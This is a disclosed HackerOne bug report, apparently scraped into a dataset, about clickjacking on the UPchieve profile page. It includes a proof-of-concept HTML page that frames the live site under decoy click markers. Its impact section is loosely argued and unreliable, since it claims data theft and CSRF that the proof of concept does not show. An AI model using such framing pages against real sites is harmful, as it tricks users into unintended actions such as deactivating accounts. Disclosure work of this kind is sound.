---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1166084'
original_report_id: '1166084'
title: CLICKJACKING LEADS TO DEACTIVATE ACCOUNT
weakness: UI Redressing (Clickjacking)
team_handle: upchieve
created_at: '2021-08-12T07:03:16.193Z'
disclosed_at: '2021-08-16T17:21:19.802Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 2
asset_identifier: hackers.upchieve.org
asset_type: URL
max_severity: critical
tags:
- hackerone
- ui-redressing-clickjacking
---

# CLICKJACKING LEADS TO DEACTIVATE ACCOUNT

## Metadata

- HackerOne Report ID: 1166084
- Weakness: UI Redressing (Clickjacking)
- Program: upchieve
- Disclosed At: 2021-08-16T17:21:19.802Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

Hello UPCHEIVE SECURITY TEAM,

I'm Anto

Vulnerability :
Clickjacking in (https://hackers.upchieve.org/profile)

Steps to Reproduce:
1). Create a HTML file with following code

<!DOCTYPE HTML>
    <html lang="en-US">
    <head>
    <meta charset="UTF-8">
    </head>
    <body>
    <p>Click the place where its shows </p>
    <div style="position: absolute; left: 1150px; top: 180px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 350px; top: 580px; pointer-events: none;">Click 2</div>
    <div style="position: absolute; left: 800px; top: 1650px; pointer-events: none;">Click 2</div>
<iframe height="3000" width="1300" scrolling="no" src="https://hackers.upchieve.org/profile"></iframe>
  </body>   
  </html>

2), Save and Open it on your browser the page will be appear.

## Impact

An attacker can host this domain in other evil site by using iframe and if a user fill the given filed it can directly redirect as logs to attacker and after its redirect to your web server.. its lead to steal user information too and use that host site as phishing of your site its CSRF and Clickjacking.

Regards,
Anto

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
